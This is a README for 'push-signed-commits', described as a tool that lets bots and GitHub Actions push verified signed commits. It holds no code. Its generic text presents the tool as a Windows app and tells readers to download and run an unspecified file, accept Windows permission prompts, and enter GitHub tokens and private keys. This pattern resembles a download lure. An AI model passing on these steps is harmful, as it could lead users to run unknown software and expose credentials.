# 🔏 push-signed-commits - Verified commits for bots and actions

[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/pondolandtimes/push-signed-commits)

## 🧭 What this app does

push-signed-commits helps bots and GitHub Actions create signed commits that GitHub can verify.

Use it when you want an automated account to push changes with a verified commit status. It fits common Git workflows and works with GitHub API, GitHub Apps, and GitHub Actions.

## 💻 What you need

- A Windows PC
- Internet access
- A GitHub account
- Permission to download files from GitHub
- A GitHub repository where you can push changes

If you plan to use this with GitHub Actions or a bot account, you also need:
- A GitHub App or bot setup
- A private key or token for the account
- Commit signing keys or a signing service set up for the bot

## 🚀 Download and install

Visit this page to download:
[https://github.com/pondolandtimes/push-signed-commits](https://github.com/pondolandtimes/push-signed-commits)

1. Open the link in your browser.
2. Look for the latest release, project files, or build download.
3. Download the Windows file to your computer.
4. If the file is a ZIP file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Run the app file if one is included.

If Windows asks for permission, choose Yes.

## 🛠️ First-time setup

After you open the app, set up the values it needs:

1. Choose the GitHub repository you want to use.
2. Connect your GitHub account, bot, or GitHub App.
3. Add the commit signing details.
4. Set the branch that should receive the commits.
5. Save the settings.

A typical setup uses:
- Repository name
- Branch name
- GitHub access token or app connection
- Signing key or signing service
- Commit author name and email

## 📦 How it works

The app helps an automated user make a normal Git commit, sign it, and push it to GitHub.

A simple flow looks like this:

1. The bot or GitHub Action creates a change.
2. The app signs the commit.
3. Git pushes the signed commit to the target branch.
4. GitHub shows the commit as verified when the signing data matches.

## 🧩 Common use cases

- A bot updates files in a repository
- A GitHub Action writes build output back to the repo
- An automation account keeps commit history verified
- A release process needs signed commits from a machine account
- A service account pushes docs, version files, or generated code

## 🔐 GitHub App and bot setup

If you use a GitHub App, make sure it has access to:
- Read and write repository contents
- Create commits
- Push to branches
- Read pull request data if your workflow needs it

If you use a bot account, make sure the account has:
- Write access to the repository
- A valid token
- Signing support set up before it makes commits

## 🪟 Windows use

This project is meant to run on Windows for end users who want a simple local setup.

Follow these steps:
1. Download the app from the link above.
2. Save it to a folder you can find again.
3. Extract it if Windows downloads it as a ZIP file.
4. Open the app file.
5. Connect it to your GitHub account or workflow.
6. Run your first signed commit task.

## ✅ Verify the result

After the app pushes a commit, check GitHub:

1. Open your repository.
2. Open the commit list.
3. Click the new commit.
4. Look for the Verified badge.
5. Confirm the author and branch are correct.

If the badge does not show, check:
- The signing key
- The GitHub token or app connection
- The author email
- Branch permissions
- The repository settings for commit verification

## 🧪 Example workflow

A simple bot workflow can look like this:

1. A GitHub Action runs on a schedule.
2. It updates a file such as a version number or changelog.
3. push-signed-commits signs the new commit.
4. The app pushes the commit to the repo.
5. GitHub marks it as verified.

This is useful for:
- Scheduled updates
- Generated files
- Release notes
- Dependency version changes
- Documentation changes

## 🧰 Troubleshooting

### The file will not open
- Check that the download finished.
- Make sure you extracted the ZIP file first.
- Right-click the file and choose Open.

### GitHub does not show Verified
- Confirm the signing key matches the account.
- Check that the commit author email matches the signed identity.
- Make sure the bot or app has the right permissions.
- Confirm the commit was pushed to GitHub, not kept local.

### The app cannot connect to GitHub
- Check your internet connection.
- Re-enter the token or app details.
- Make sure the token has access to the repo.
- Check that the GitHub App is installed on the right repository

### The commit does not push
- Check branch access
- Check for protected branch rules
- Confirm the repo allows pushes from your account or app
- Try a branch you control

## 📁 Typical files and settings

You may see settings for:
- `repository`
- `branch`
- `authorName`
- `authorEmail`
- `token`
- `privateKey`
- `signingMethod`
- `pushMode`

These values tell the app where to commit and how to sign the commit.

## 🔗 Project details

Repository: [pondolandtimes/push-signed-commits](https://github.com/pondolandtimes/push-signed-commits)

Topics:
bot, commit, git, github, github-actions, github-api, github-app, github-bot, signed, signed-commits, verified, verified-commits